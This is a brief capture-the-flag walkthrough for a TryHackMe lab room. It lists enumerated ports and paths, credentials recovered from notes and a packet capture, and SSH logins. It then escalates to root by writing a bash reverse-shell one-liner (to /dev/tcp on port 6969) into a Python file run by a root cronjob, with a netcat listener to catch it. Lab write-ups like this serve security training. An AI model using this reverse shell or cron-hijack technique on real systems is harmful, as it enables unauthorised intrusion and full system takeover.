# Valley

[Valley](https://tryhackme.com/room/valleype)

## Solution

Ports: 22, 80, 37370

HTTP 80
* /gallery
* /pricing
* /static
* /pricing/note.txt
* /static/00
* /dev1243224123123
* /dev1243224123123/devNotes37370.txt

FTP 37370
* Login `siemDev:california`
* 3 pcapng files

siemHTTP2.pcapng
* uname=valleyDev&psw=ph0t0s1234&remember=on

SSH 22:
* Login `valleyDev:ph0t0s1234`
    * sudo -l : nothing
    * env : nothing
    * suid : nothing
* Login `siemDev:california`
    * sudo -l : nothing
* interesting binary: /home/valleyAuthenticator (contains username and password)
* Login `valley:liberty123`
    * valley can write to base64.py file that is used in a cronjob by root
    * insert `import os; os.system("/bin/bash -c '/bin/sh -i >& /dev/tcp/$HOST/6969 0>&1'")`
    * locally run `nc -lvnp 6969`
